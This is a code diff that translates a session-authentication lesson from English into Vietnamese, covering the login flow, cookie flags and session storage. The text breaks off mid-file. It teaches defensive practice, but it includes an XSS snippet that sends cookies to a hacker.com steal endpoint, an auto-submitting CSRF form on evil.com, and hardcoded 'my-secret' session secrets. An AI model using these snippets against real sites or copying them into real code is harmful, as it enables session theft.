@@ -5,95 +5,513 @@
 
 export const sessionAuthContent = {
   storyHook: {
-    title: "KEYCARD PROTOCOL",
+    title: "THẺ THANG MÁY",
     subtitle: "Session-Based Authentication",
-    clearanceLevel: "Basic Access",
-    status: "ACTIVE",
-    narrative: `You're entering NeoTech Tower - a high-security corporate stronghold in 2084.
-At the entrance checkpoint, security verifies your retina scan and issues you a physical keycard.
-This card is your SESSION - it grants access to authorized zones, tracks your movements, and expires
-at midnight. Lose it? You're locked out instantly. Let someone steal it? They have full access until you report it.`,
+    clearanceLevel: "Cơ Bản",
+    status: "ĐANG HOẠT ĐỘNG",
+    narrative: `Bạn đang vào một tòa chung cư cao cấp. Bảo vệ kiểm tra CMND của bạn, sau đó đưa cho bạn một thẻ từ.
+
+Thẻ này cho phép bạn: vào thang máy, mở cửa phòng, sử dụng hồ bơi, và ra vào tòa nhà.
+Thẻ có hiệu lực trong 24 giờ, sau đó bạn cần đổi thẻ mới.
+
+Mất thẻ? Bạn bị khóa ngay lập tức - bảo vệ vô hiệu hóa thẻ trong hệ thống.
+Ai đó ăn cắp thẻ? Họ có toàn quyền truy cập cho đến khi bạn báo mất.
+
+Đó chính là cách **Session Authentication** hoạt động!`,
   },
 
   sections: [
     // ESSENTIAL SECTIONS
     {
       id: 'section-1',
-      category: 'essential',
-      title: 'Access Granted: What is Session Auth?',
+      category: 'concepts',
+      title: 'Session Auth Là Gì?',
       icon: 'Key',
-      content: `Session authentication is like a physical keycard at a building. When you successfully log in,
-the server creates a unique session ID and sends it to your browser as a cookie. This cookie is automatically
-included in every subsequent request, allowing the server to "remember" who you are.
+      content: `### 🏦 Trong Cuộc Sống
 
-Unlike stateless authentication (JWT), sessions are **stateful** - the server maintains a record of all active
-sessions in memory or a database. This gives you instant control: logout, and the session is destroyed immediately.
+**Ví dụ 1: Đi ngân hàng**
 
-Think of it as the difference between a keycard (session) and a passport (JWT). The keycard only works while
-the building's security system knows it's valid. Lose the keycard, and security can deactivate it instantly.`,
+Bạn đến ngân hàng rút tiền. Nhân viên kiểm tra CMND và yêu cầu bạn ký vào phiếu giao dịch.
+Sau đó, họ đưa cho bạn một "phiếu số thứ tự" - giả sử là số 42.
+
+Mỗi lần bạn cần làm gì (rút tiền, chuyển khoản, kiểm tra số dư), bạn chỉ cần đưa phiếu số 42.
+Nhân viên nhìn số, tra trong sổ sách: "À, số 42 là khách hàng Nguyễn Văn A, đã xác thực rồi"
+→ Thực hiện giao dịch ngay.
+
+Bạn không cần show CMND lại mỗi lần. Phiếu số 42 chính là **"session"** của bạn!
+
+**Ví dụ 2: Đăng nhập Facebook**
+
+Sáng nay bạn đăng nhập Facebook trên laptop. Suốt cả ngày, bạn xem newsfeed, like ảnh, comment -
+nhưng Facebook KHÔNG bao giờ hỏi password lại.
+
+Tại sao? Vì khi bạn đăng nhập lần đầu, Facebook đã tạo một "phiên làm việc" (session) và lưu
+vào browser. Mỗi lần bạn click gì đó, browser tự động gửi session này kèm theo. Facebook biết:
+"À, đây là bạn rồi" → Cho phép truy cập.
+
+**Ví dụ 3: Netflix trên Smart TV**
+
+Bạn đăng nhập Netflix trên Smart TV lúc 8 giờ tối. Xem phim xong, tắt TV đi ngủ.
+Sáng hôm sau mở lại, vẫn đăng nhập sẵn - không cần nhập password lại.
+
+Đó là nhờ session cookie - nó "nhớ" bạn trong 24-48 giờ (tùy cài đặt của Netflix).
+
+### 🔍 Bản Chất Hoạt Động
+
+Session Authentication hoạt động như thế này:
+
+1. **Bạn đăng nhập** → Server kiểm tra username + password
+2. **Server tạo "phiếu số"** → Một số ngẫu nhiên (ví dụ: abc123xyz)
+3. **Server ghi sổ** → "Phiếu abc123xyz = User Nguyễn Văn A"
+4. **Server đưa phiếu cho bạn** → Gửi về browser dưới dạng "cookie"
+5. **Browser giữ phiếu** → Lưu cookie tự động
+6. **Mỗi lần request** → Browser tự động gửi cookie kèm theo
+7. **Server tra sổ** → "Phiếu abc123xyz à? Đây là Nguyễn Văn A" → OK!
+
+**Điểm khác biệt với JWT**:
+- **Session**: Server lưu thông tin, cookie chỉ chứa "số phiếu" (stateful)
+- **JWT**: Token tự chứa thông tin, server chỉ verify chữ ký (stateless)
+
+Giống như:
+- **Session** = Thẻ thang máy (tòa nhà phải tra cứu database)
+- **JWT** = Passport (nhân viên hải quan chỉ cần xem, không cần gọi điện về nước)
+
+### 💻 Trong Lập Trình
+
+Khi bạn code, session hoạt động như sau:
+
+**Bước 1: User đăng nhập**
+\`\`\`javascript
+// User gửi: { username: "alice", password: "secret123" }
+\`\`\`
+
+**Bước 2: Server tạo session**
+\`\`\`javascript
+const sessionId = crypto.randomBytes(32).toString('hex'); // Tạo số ngẫu nhiên
+// sessionId = "a1b2c3d4e5f6..." (64 ký tự)
+\`\`\`
+
+**Bước 3: Server lưu vào database**
+\`\`\`javascript
+database.sessions.create({
+  id: "a1b2c3d4e5f6...",
+  userId: 123,           // ID của user Alice
+  createdAt: new Date(), // Thời điểm tạo
+  expiresAt: new Date(Date.now() + 24*60*60*1000) // Hết hạn sau 24h
+});
+\`\`\`
+
+**Bước 4: Server gửi cookie về browser**
+\`\`\`javascript
+response.cookie('sessionId', 'a1b2c3d4e5f6...', {
+  httpOnly: true,    // JavaScript không đọc được (bảo mật!)
+  secure: true,      // Chỉ gửi qua HTTPS
+  maxAge: 86400000   // 24 giờ
+});
+\`\`\`
+
+**Bước 5: Browser tự động gửi cookie mỗi request**
+\`\`\`javascript
+// Browser tự động thêm header:
+// Cookie: sessionId=a1b2c3d4e5f6...
+\`\`\`
+
+**Bước 6: Server kiểm tra**
+\`\`\`javascript
+const sessionId = request.cookies.sessionId;
+const session = database.sessions.findById(sessionId);
+
+if (session && session.expiresAt > new Date()) {
+  // Session hợp lệ → Cho phép truy cập
+  const user = database.users.findById(session.userId);
+  // Bây giờ biết user là ai rồi!
+} else {
+  // Session hết hạn hoặc không tồn tại → Yêu cầu đăng nhập lại
+}
+\`\`\`
+
+### ⚠️ Điều Quan Trọng
+
+**Ưu điểm**:
+- ✅ Server kiểm soát hoàn toàn - muốn logout ai thì xóa session của họ
+- ✅ Bảo mật cao - có thể thu hồi quyền truy cập ngay lập tức
+- ✅ Phù hợp với web app truyền thống (Facebook, Gmail, Netflix)
+
+**Nhược điểm**:
+- ❌ Server phải lưu trữ session (tốn bộ nhớ/database)
+- ❌ Khó scale ngang (nhiều server phải share session storage)
+- ❌ Không phù hợp với mobile app (cookie không hoạt động tốt)
+
+**Khi nào dùng Session Auth?**
+- ✅ Website truyền thống (Facebook, Gmail, admin panel)
+- ✅ Cần logout ngay lập tức (ngân hàng, healthcare)
+- ✅ Bảo mật là ưu tiên số 1
+- ❌ Mobile app → Nên dùng JWT
+- ❌ Microservices → Nên dùng JWT`,
       keyPoints: [
-        'Server creates a unique session ID on successful login',
-        'Session ID stored as HTTP-Only cookie in browser',
-        'Server maintains session data (stateful architecture)',
-        'Cookie automatically sent with every request',
-        'Instant revocation when user logs out'
+        'Session = "phiếu số thứ tự" tại ngân hàng - server tra cứu để biết bạn là ai',
+        'Cookie tự động gửi kèm mỗi request - bạn không cần làm gì',
+        'Server lưu session trong database - kiểm soát hoàn toàn',
+        'Logout = xóa session → hiệu lực ngay lập tức',
+        'Phù hợp web app, không phù hợp mobile app'
       ],
-      visual: 'Side-by-side comparison: Physical keycard ↔ Session cookie',
+      visual: 'So sánh: Thẻ ngân hàng (Session) ↔ Passport (JWT)',
     },
     {
       id: 'section-2',
-      category: 'essential',
-      title: 'The Authentication Sequence',
+      category: 'concepts',
+      title: 'Quy Trình Đăng Nhập: 7 Bước Quan Trọng',
       icon: 'GitBranch',
-      content: `The session authentication flow has 7 critical steps, each designed to maximize security while
-maintaining simplicity. Understanding this flow is essential for implementing secure authentication.
+      content: `### 📧 Ví Dụ: Đăng Nhập Gmail
 
-Step 1: User submits credentials (username + password)
-Step 2: Server verifies password hash using bcrypt
-Step 3: Server generates cryptographically random session ID
-Step 4: Server stores session data in database (user ID, creation time, expiry)
-Step 5: Server sets HTTP-Only cookie with session ID
-Step 6: Browser automatically sends cookie with subsequent requests
-Step 7: Server validates session ID and retrieves user data
+Sáng nay bạn mở Gmail lần đầu. Hãy xem điều gì xảy ra từng bước một:
 
-Each step has security implications. Skip session ID generation randomness? Attackers can guess IDs.
-Forget HTTP-Only flag? JavaScript can steal cookies via XSS. Understanding WHY each step exists is key.`,
+**Bước 1: Bạn nhập thông tin**
+\`\`\`
+Email: alice@gmail.com
+Password: MySecretPass123
+\`\`\`
+
+**Bước 2: Gmail kiểm tra password**
+- Gmail KHÔNG lưu password dạng text thuần
+- Gmail lưu "hash" (mã hóa 1 chiều) của password
+- Ví dụ: "MySecretPass123" → "$2a$10$N9qo8uLOickgx2ZMRZoMye..."
+- Gmail so sánh hash → Đúng ✓
+
+**Bước 3: Gmail tạo "phiếu số"**
+\`\`\`javascript
+// Gmail tạo số ngẫu nhiên siêu dài
+sessionId = "a7f3b9d2e8c1f4a6b3d9e7c2f8a1b4d6..."
+// 64 ký tự, không ai đoán được!
+\`\`\`
+
+**Bước 4: Gmail ghi sổ**
+\`\`\`javascript
+// Gmail lưu vào database
+{
+  sessionId: "a7f3b9d2e8c1...",
+  userId: 12345,              // ID của alice@gmail.com
+  createdAt: "2026-01-18 07:00:00",
+  expiresAt: "2026-01-18 19:00:00"  // Hết hạn sau 12 giờ
+}
+\`\`\`
+
+**Bước 5: Gmail gửi "phiếu" cho bạn**
+\`\`\`javascript
+// Gmail gửi cookie về browser
+Set-Cookie: sessionId=a7f3b9d2e8c1...;
+            HttpOnly;    // JavaScript không đọc được
+            Secure;      // Chỉ gửi qua HTTPS
+            SameSite=Strict;  // Chỉ gửi từ gmail.com
+            Max-Age=43200     // 12 giờ
+\`\`\`
+
+**Bước 6: Browser tự động lưu**
+- Browser nhận cookie
+- Lưu vào bộ nhớ tự động
+- Bạn không cần làm gì cả!
+
+**Bước 7: Mỗi lần bạn làm gì đó**
+\`\`\`
+Bạn: Click "Compose" để viết email
+Browser: Tự động gửi cookie kèm request
+Gmail: Nhận cookie → Tra database → "À, đây là Alice" → OK!
+\`\`\`
+
+### 🔄 Quy Trình Chi Tiết
+
+\`\`\`
+┌─────────────┐                    ┌─────────────┐
+│   Browser   │                    │   Server    │
+│  (Bạn)      │                    │  (Gmail)    │
+└─────────────┘                    └─────────────┘
+       │                                   │
+       │  1. POST /login                   │
+       │  { email, password }              │
+       │──────────────────────────────────▶│
+       │                                   │
+       │                          2. Kiểm tra password
+       │                          bcrypt.compare()
+       │                                   │
+       │                          3. Tạo Session ID
+       │                          crypto.randomBytes(32)
+       │                                   │
+       │                          4. Lưu vào Database
+       │                          sessions.create()
+       │                                   │
+       │  5. Set-Cookie: sessionId=...     │
+       │◀──────────────────────────────────│
+       │                                   │
+  6. Browser lưu cookie tự động
+       │                                   │
+       │  7. GET /inbox                    │
+       │  Cookie: sessionId=...            │
+       │──────────────────────────────────▶│
+       │                                   │
+       │                          8. Tra database
+       │                          sessions.findById()
+       │                                   │
+       │  9. Response: Inbox data          │
+       │◀──────────────────────────────────│
+       │                                   │
+\`\`\`
+
+### ⚠️ Tại Sao Mỗi Bước Quan Trọng?
+
+**Bước 2: Hash password**
+- ❌ Lưu "MySecretPass123" → Hacker hack database thấy password
+- ✅ Lưu "$2a$10$N9qo..." → Hacker không thể đảo ngược ra password
+
+**Bước 3: Random session ID**
+- ❌ Dùng \`Math.random()\` → Hacker đoán được
+- ✅ Dùng \`crypto.randomBytes()\` → Không thể đoán (2^256 khả năng)
+
+**Bước 4: Lưu server-side**
+- ✅ Server kiểm soát hoàn toàn
+- ✅ Muốn logout → Xóa session → Hiệu lực ngay lập tức
+
+**Bước 5: HttpOnly cookie**
+- ✅ JavaScript không đọc được
+- ✅ Chặn XSS attack
+
+**Bước 6: Browser tự động**
+- ✅ Bạn không cần code gì
+- ✅ Cookie tự động gửi kèm mỗi request
+
+**Bước 7: Validate mỗi request**
+- ✅ Mỗi request đều kiểm tra session
+- ✅ Session hết hạn → Yêu cầu đăng nhập lại
+
+### 💻 Code Ví Dụ
+
+**Server (Node.js/Express)**:
+\`\`\`javascript
+// Bước 1-5: Login endpoint
+app.post('/login', async (req, res) => {
+  const { email, password } = req.body;
+
+  // Bước 2: Kiểm tra password
+  const user = await db.users.findOne({ email });
+  const isValid = await bcrypt.compare(password, user.passwordHash);
+
+  if (!isValid) {
+    return res.status(401).json({ error: 'Sai password!' });
+  }
+
+  // Bước 3: Tạo session ID
+  const sessionId = crypto.randomBytes(32).toString('hex');
+
+  // Bước 4: Lưu vào database
+  await db.sessions.create({
+    id: sessionId,
+    userId: user.id,
+    expiresAt: new Date(Date.now() + 12*60*60*1000) // 12 giờ
+  });
+
+  // Bước 5: Gửi cookie
+  res.cookie('sessionId', sessionId, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'strict',
+    maxAge: 12*60*60*1000
+  });
+
+  res.json({ success: true, user: { email: user.email } });
+});
+
+// Bước 7-9: Middleware kiểm tra session
+async function requireAuth(req, res, next) {
+  const sessionId = req.cookies.sessionId;
+
+  if (!sessionId) {
+    return res.status(401).json({ error: 'Chưa đăng nhập!' });
+  }
+
+  // Bước 8: Tra database
+  const session = await db.sessions.findById(sessionId);
+
+  if (!session || session.expiresAt < new Date()) {
+    return res.status(401).json({ error: 'Session hết hạn!' });
+  }
+
+  // Bước 9: Lấy thông tin user
+  req.user = await db.users.findById(session.userId);
+  next();
+}
+
+// Sử dụng middleware
+app.get('/inbox', requireAuth, (req, res) => {
+  // req.user đã có sẵn nhờ middleware
+  res.json({ emails: [...] });
+});
+\`\`\`
+
+### 🎯 Tóm Tắt
+
+| Bước | Hành Động | Tại Sao Quan Trọng |
+|------|-----------|-------------------|
+| 1 | User gửi credentials | Xác thực danh tính |
+| 2 | Server verify password hash | Bảo mật password |
+| 3 | Tạo random session ID | Không thể đoán được |
+| 4 | Lưu session vào database | Server kiểm soát |
+| 5 | Gửi cookie về browser | HttpOnly = an toàn |
+| 6 | Browser lưu tự động | Tiện lợi cho user |
+| 7 | Validate mỗi request | Đảm bảo bảo mật |`,
       keyPoints: [
-        'Always hash passwords with bcrypt (never store plain text)',
-        'Use crypto.randomBytes for session ID generation',
-        'Store sessions server-side with expiration timestamps',
-        'Set HTTP-Only cookie to prevent JavaScript access',
-        'Validate session on every protected request'
+        'Bước 2: Hash password với bcrypt - KHÔNG BAO GIỜ lưu plain text',
+        'Bước 3: crypto.randomBytes(32) - Không thể đoán được',
+        'Bước 4: Lưu server-side - Kiểm soát hoàn toàn',
+        'Bước 5: HttpOnly cookie - Chặn JavaScript đọc',
+        'Bước 7: Validate mỗi request - Kiểm tra session còn hạn không'
       ],
-      visual: 'Flow diagram with 7 numbered steps showing client-server interaction',
+      visual: 'Sơ đồ 7 bước: User → Browser → Server → Database',
     },
     {
       id: 'section-3',
-      category: 'essential',
-      title: 'Cookie Security Protocols',
+      category: 'concepts',
+      title: 'Bảo Mật Cookie: 4 Lá Chắn Quan Trọng',
       icon: 'Shield',
-      content: `HTTP cookies have four critical security attributes that transform a simple text value into
-a secure authentication mechanism. Missing even ONE attribute can create serious vulnerabilities.
+      content: `### ☕ Tình Huống Thực Tế
 
-**HTTP-Only**: Prevents JavaScript from reading the cookie via document.cookie. This stops XSS attacks
-from stealing session IDs. Without this, a single script injection can compromise every user session.
+Bạn đang ngồi ở quán cà phê, dùng WiFi công cộng để check Facebook. Một hacker cũng đang ở quán,
+đã cài script độc hại vào mạng WiFi.
 
-**Secure**: Cookie only sent over HTTPS, never HTTP. Prevents network sniffing attacks. In 2084's
-surveillance state, unencrypted traffic is basically broadcasting your credentials.
+**Kịch bản tấn công**:
+1. Hacker chạy script đọc cookie Facebook của bạn
+2. Hacker copy cookie vào browser của họ
+3. Hacker mở Facebook → Đăng nhập thành công với tài khoản của bạn!
+4. Hacker đọc tin nhắn, post bài, thậm chí đổi password
 
-**SameSite=Strict**: Prevents cross-site request forgery (CSRF). Cookie won't be sent if request
-originates from another domain. Your session can't be hijacked by evil.com.
+**Nhưng thực tế**: Facebook dùng cookie bảo mật → Hacker THẤT BẠI!
 
-**Max-Age**: Session expiration in seconds. Limits the damage window if a session is stolen.
-Short timeouts (15-30 minutes) are standard for high-security applications.`,
+Tại sao? Vì Facebook set 4 cờ bảo mật cho cookie. Thiếu 1 cờ = lỗ hổng nghiêm trọng.
+
+### 🛡️ 4 Lá Chắn Bảo Mật
+
+#### 1. **HttpOnly** - Chặn JavaScript Đọc Cookie
+
+**Vấn đề**: Script độc hại có thể đọc cookie qua \`document.cookie\`
+
+**Giải pháp**: Set \`httpOnly: true\`
+
+**Ví dụ tấn công BỊ CHẶN**:
+\`\`\`javascript
+// Hacker inject script này vào website
+<script>
+  // Cố gắng đọc cookie
+  const cookie = document.cookie;
+  // Gửi về server của hacker
+  fetch('https://hacker.com/steal?cookie=' + cookie);
+</script>
+
+// KẾT QUẢ: document.cookie = "" (rỗng!)
+// Cookie có HttpOnly không thể đọc được → Hacker thất bại ✓
+\`\`\`
+
+**Trong thực tế**:
+- ✅ Facebook, Gmail, Netflix đều dùng HttpOnly
+- ❌ Nếu không dùng → XSS attack thành công 100%
+
+#### 2. **Secure** - Chỉ Gửi Qua HTTPS
+
+**Vấn đề**: Cookie gửi qua HTTP (không mã hóa) → Hacker nghe lén mạng WiFi
+
+**Giải pháp**: Set \`secure: true\` → Cookie chỉ gửi qua HTTPS
+
+**Ví dụ**:
+\`\`\`javascript
+// Bạn truy cập: http://example.com (HTTP - không an toàn)
+// Cookie KHÔNG được gửi → Bạn phải đăng nhập lại
+
+// Bạn truy cập: https://example.com (HTTPS - an toàn)
+// Cookie được gửi → Đăng nhập tự động ✓
+\`\`\`
+
+**Tại sao quan trọng?**:
+- HTTP = gửi dữ liệu dạng text thuần → Hacker đọc được
+- HTTPS = mã hóa dữ liệu → Hacker chỉ thấy ký tự loạn xạ
+
+**Ví dụ thực tế**:
+- Bạn dùng WiFi quán cà phê
+- Hacker chạy Wireshark (công cụ nghe lén mạng)
+- NẾU cookie không có Secure → Hacker thấy: \`sessionId=abc123xyz\`
+- NẾU cookie có Secure → Hacker thấy: \`�%$#@!*&\` (gibberish)
+
+#### 3. **SameSite=Strict** - Chặn CSRF Attack
+
+**Vấn đề**: Website độc hại gửi request đến Facebook kèm cookie của bạn
+
+**Giải pháp**: Set \`sameSite: 'strict'\` → Cookie chỉ gửi từ cùng domain
+
+**Ví dụ tấn công**:
+\`\`\`html
+<!-- Hacker tạo website: evil.com -->
+<form action="https://facebook.com/post" method="POST">
+  <input name="message" value="Tôi bị hack rồi!" />
+</form>
+<script>
+  // Tự động submit form
+  document.forms[0].submit();
+</script>
+
+<!-- KẾT QUẢ -->
+<!-- NẾU không có SameSite: Cookie Facebook được gửi → Post thành công -->
+<!-- NẾU có SameSite=Strict: Cookie KHÔNG được gửi → Post thất bại ✓ -->
+\`\`\`
+
+**Trong cuộc sống**:
+- Bạn đang đăng nhập Facebook
+- Bạn click vào link lạ: evil.com
+- evil.com cố gắng post bài lên Facebook của bạn
+- SameSite=Strict chặn → Cookie không được gửi → Thất bại!
+
+#### 4. **MaxAge** - Giới Hạn Thời Gian Sống
+
+**Vấn đề**: Cookie sống mãi mãi → Nếu bị đánh cắp, hacker dùng mãi
+
+**Giải pháp**: Set \`maxAge\` (thời gian sống tính bằng giây)
+
+**Ví dụ**:
+\`\`\`javascript
+// Ngân hàng: 15 phút (900 giây)
+maxAge: 15 * 60  // 900 giây
+
+// Facebook: 2 tuần (1,209,600 giây)
+maxAge: 14 * 24 * 60 * 60  // 1,209,600 giây
+
+// Netflix: 30 ngày
+maxAge: 30 * 24 * 60 * 60  // 2,592,000 giây
+\`\`\`
+
+**Tại sao quan trọng?**:
+- Session bị đánh cắp → Hacker chỉ dùng được trong thời gian MaxAge
+- MaxAge ngắn = cửa sổ tấn công nhỏ
+- MaxAge dài = tiện lợi nhưng rủi ro cao
+
+**Thực tế**:
+- Ngân hàng: 15-30 phút (bảo mật tối đa)
+- Admin panel: 1-2 giờ
+- Mạng xã hội: 1-2 tuần (UX tốt hơn)
+- Streaming: 30 ngày (không cần đăng nhập lại)
+
+### 📋 Tóm Tắt
+
+| Cờ Bảo Mật | Chặn Loại Tấn Công | Ví Dụ Thực Tế |
+|-------------|---------------------|----------------|
+| **HttpOnly** | XSS (Cross-Site Scripting) | Script độc không đọc được cookie |
+| **Secure** | Network Sniffing | Hacker nghe lén WiFi không thấy cookie |
+| **SameSite** | CSRF (Cross-Site Request Forgery) | Website độc không gửi được request kèm cookie |
+| **MaxAge** | Stolen Cookie Reuse | Cookie hết hạn sau X giờ |
+
+**Quy tắc vàng**: LUÔN LUÔN set cả 4 cờ! Thiếu 1 cờ = lỗ hổng bảo mật nghiêm trọng.`,
       keyPoints: [
-        'HTTP-Only stops XSS cookie theft (blocks document.cookie)',
-        'Secure flag prevents network sniffing (HTTPS only)',
-        'SameSite=Strict prevents CSRF attacks (blocks cross-origin)',
-        'Max-Age limits exposure window (typically 15-30 min)',
-        'All four attributes must be set for maximum security'
+        'HttpOnly: JavaScript không đọc được → Chặn XSS',
+        'Secure: Chỉ gửi qua HTTPS → Chặn network sniffing',
+        'SameSite=Strict: Chỉ gửi từ cùng domain → Chặn CSRF',
+        'MaxAge: Giới hạn thời gian sống → Giảm thiểu thiệt hại nếu bị đánh cắp',
+        'Thiếu 1 trong 4 cờ = lỗ hổng bảo mật nghiêm trọng'
       ],
-      visual: 'Table showing: Attribute | Protection | Attack Prevented',
+      visual: 'Bảng so sánh: Cờ bảo mật | Loại tấn công | Ví dụ thực tế',
       codeExamples: {
         javascript: `// Express.js - Setting secure session cookie
 app.post('/login', async (req, res) => {
@@ -190,56 +608,520 @@ end`
     // IMPORTANT SECTIONS
     {
       id: 'section-4',
-      category: 'important',
-      title: 'Session Storage: Where to Keep State',
+      category: 'system',
+      title: 'Lưu Session Ở Đâu? 3 Lựa Chọn',
       icon: 'Database',
-      content: `Choosing where to store sessions impacts performance, scalability, and reliability.
-In 2084's cloud infrastructure, the wrong choice can mean the difference between milliseconds and disaster.
+      content: `### 🏢 Tình Huống: Startup vs Enterprise
 
-**In-Memory (Process RAM)**: Fastest option - sessions live in application memory. Perfect for development
-or single-server apps. Downside: Server restart = all users logged out. Horizontal scaling impossible.
+**Startup nhỏ (100 users)**:
+- 1 server duy nhất
+- Restart server 1 lần/tuần để update
+- Budget hạn chế
 
-**Database (PostgreSQL/MySQL)**: Persistent storage survives restarts. Works across multiple servers.
-Slower than memory (disk I/O), but reliable. Good for traditional monoliths with moderate traffic.
+**Enterprise lớn (1 triệu users)**:
+- 50 servers chạy song song
+- Không được phép downtime
+- Cần scale liên tục
 
-**Redis/Memcached**: Best of both worlds - in-memory speed with persistence and replication. Can scale
-horizontally. Industry standard for high-traffic apps. Netflix, Twitter, GitHub all use Redis for sessions.`,
+→ Mỗi trường hợp cần cách lưu session KHÁC NHAU!
+
+### 💾 3 Cách Lưu Session
+
+#### 1. **In-Memory (RAM)** - Lưu Trong Bộ Nhớ Server
+
+**Cách hoạt động**:
+\`\`\`javascript
+// Session lưu trong biến JavaScript
+const sessions = new Map();
+
+sessions.set('abc123', {
+  userId: 42,
+  createdAt: new Date()
+});
+\`\`\`
+
+**Ưu điểm**:
+- ⚡ **Cực nhanh**: Đọc/ghi trong RAM (< 1ms)
+- 🎯 **Đơn giản**: Không cần setup database
+- 💰 **Miễn phí**: Không tốn tiền infrastructure
+
+**Nhược điểm**:
+- ❌ **Restart = mất hết**: Server restart → Tất cả users bị logout
+- ❌ **Không scale ngang**: 2 servers không share session
+- ❌ **Giới hạn RAM**: 1GB RAM = ~100,000 sessions
+
+**Khi nào dùng**:
+- ✅ Development/testing
+- ✅ Startup nhỏ (< 1,000 users)
+- ✅ Prototype/MVP
+- ❌ Production với nhiều users
+- ❌ Cần high availability
+
+**Ví dụ thực tế**:
+\`\`\`javascript
+// Express.js với express-session
+const session = require('express-session');
+
+app.use(session({
+  store: new MemoryStore(),  // Lưu trong RAM
+  secret: 'my-secret',
+  resave: false,
+  saveUninitialized: false
+}));
+
+// Vấn đề: Server restart → Tất cả users logout!
+\`\`\`
+
+---
+
+#### 2. **Database (PostgreSQL/MySQL)** - Lưu Trong Database
+
+**Cách hoạt động**:
+\`\`\`sql
+-- Table sessions trong PostgreSQL
+CREATE TABLE sessions (
+  id VARCHAR(64) PRIMARY KEY,
+  user_id INTEGER,
+  data JSONB,
+  expires_at TIMESTAMP
+);
+
+-- Mỗi request → Query database
+SELECT * FROM sessions WHERE id = 'abc123';
+\`\`\`
+
+**Ưu điểm**:
+- 💾 **Persistent**: Server restart → Session vẫn còn
+- 🔄 **Multi-server**: Nhiều servers cùng dùng 1 database
+- 🔍 **Query được**: Có thể tìm "sessions của user X"
+- 📊 **Analytics**: Đếm số users online, thống kê
+
+**Nhược điểm**:
+- 🐌 **Chậm hơn RAM**: Disk I/O ~ 5-10ms (vs RAM < 1ms)
+- 💰 **Tốn tiền**: Database hosting cost
+- 🔧 **Phức tạp**: Cần setup, backup, maintenance
+
+**Khi nào dùng**:
+- ✅ Production app (1,000 - 100,000 users)
+- ✅ Cần persistence (server restart OK)
+- ✅ Multi-server setup
+- ✅ Đã có database sẵn
+- ❌ Cần tốc độ cực cao
+- ❌ Hàng triệu users
+
+**Ví dụ thực tế**:
+\`\`\`javascript
+// Express.js với PostgreSQL
+const session = require('express-session');
+const pgSession = require('connect-pg-simple')(session);
+
+app.use(session({
+  store: new pgSession({
+    conString: 'postgres://localhost/mydb',
+    tableName: 'sessions'
+  }),
+  secret: 'my-secret'
+}));
+
+// Lợi ích: Server restart → Users vẫn đăng nhập ✓
+\`\`\`
+
+---
+
+#### 3. **Redis/Memcached** - In-Memory Database
+
+**Cách hoạt động**:
+\`\`\`javascript
+// Redis = Database TRONG RAM
+redis.set('session:abc123', JSON.stringify({
+  userId: 42,
+  createdAt: '2026-01-18'
+}), 'EX', 3600);  // Tự động xóa sau 1 giờ
+
+// Đọc siêu nhanh
+const session = JSON.parse(redis.get('session:abc123'));
+\`\`\`
+
+**Ưu điểm**:
+- ⚡ **Nhanh như RAM**: < 1ms latency
+- 💾 **Persistent**: Có thể lưu vào disk
+- 🔄 **Replication**: Master-slave, high availability
+- 📈 **Scale ngang**: Redis Cluster cho hàng triệu users
+- ⏰ **Auto-expire**: Tự động xóa session hết hạn
+
+**Nhược điểm**:
+- 💰 **Tốn tiền**: Redis hosting (AWS ElastiCache, Redis Cloud)
+- 🔧 **Setup phức tạp**: Cần học Redis
+- 🧠 **Giới hạn RAM**: Phải mua RAM đủ lớn
+
+**Khi nào dùng**:
+- ✅ Production app (> 10,000 users)
+- ✅ Cần tốc độ cao + persistence
+- ✅ Multi-server, microservices
+- ✅ Budget cho infrastructure
+- ✅ **Industry standard** (Facebook, Netflix, Twitter)
+
+**Ví dụ thực tế**:
+\`\`\`javascript
+// Express.js với Redis
+const session = require('express-session');
+const RedisStore = require('connect-redis')(session);
+const redis = require('redis');
+
+const redisClient = redis.createClient({
+  host: 'localhost',
+  port: 6379
+});
+
+app.use(session({
+  store: new RedisStore({ client: redisClient }),
+  secret: 'my-secret',
+  resave: false,
+  saveUninitialized: false
+}));
+
+// Best of both worlds: Nhanh + Persistent + Scalable ✓
+\`\`\`
+
+### 📊 So Sánh Chi Tiết
+
+| Tiêu Chí | In-Memory | Database | Redis |
+|----------|-----------|----------|-------|
+| **Tốc độ** | ⚡⚡⚡ (< 1ms) | 🐌 (5-10ms) | ⚡⚡⚡ (< 1ms) |
+| **Persistence** | ❌ Mất khi restart | ✅ Lưu vĩnh viễn | ✅ Có thể persist |
+| **Multi-server** | ❌ Không share | ✅ Share qua DB | ✅ Share qua Redis |
+| **Scale** | ❌ 1 server only | ⚠️ Giới hạn DB | ✅ Redis Cluster |
+| **Cost** | 💰 Free | 💰💰 Medium | 💰💰💰 High |
+| **Setup** | 🎯 Cực đơn giản | 🔧 Trung bình | 🔧🔧 Phức tạp |
+| **Use Case** | Dev/Testing | Small-Medium | Large-Scale |
+
+### 🎯 Quyết Định Nhanh
+
+**Bạn đang làm gì?**
+
+1. **Học lập trình / Prototype**
+   → In-Memory (đơn giản nhất)
+
+2. **Startup nhỏ (< 10,000 users)**
+   → Database (PostgreSQL/MySQL)
+   → Đã có database sẵn, tận dụng luôn
+
+3. **App lớn (> 10,000 users)**
+   → Redis
+   → Industry standard, proven at scale
+
+4. **Enterprise (hàng triệu users)**
+   → Redis Cluster
+   → Netflix, Facebook, Twitter đều dùng
+
+### 💡 Lời Khuyên Thực Tế
+
+**Bắt đầu đơn giản**:
+\`\`\`
+Phase 1 (MVP): In-Memory
+  ↓ (có users)
+Phase 2 (Growth): Database
+  ↓ (nhiều users)
+Phase 3 (Scale): Redis
+\`\`\`
+
+**Không cần Redis ngay từ đầu!**
+- < 1,000 users → Database đủ rồi
+- 1,000 - 10,000 users → Database + caching
+- > 10,000 users → Cân nhắc Redis
+
+**Ví dụ migration**:
+\`\`\`javascript
+// Bắt đầu với Database
+let sessionStore = new PostgreSQLStore();
+
+// Khi cần scale → Chuyển sang Redis
+if (process.env.NODE_ENV === 'production') {
+  sessionStore = new RedisStore();
+}
+
+app.use(session({ store: sessionStore }));
+\`\`\``,
       keyPoints: [
-        'In-Memory: Fastest but lost on restart, no horizontal scaling',
-        'Database: Persistent and scalable but slower (disk I/O)',
-        'Redis: In-memory speed + persistence + replication',
-        'Choose based on traffic, uptime requirements, and budget',
-        'Redis is industry standard for production applications'
+        'In-Memory: Nhanh nhất nhưng mất khi restart - dùng cho dev/testing',
+        'Database: Persistent, multi-server - dùng cho startup/medium apps',
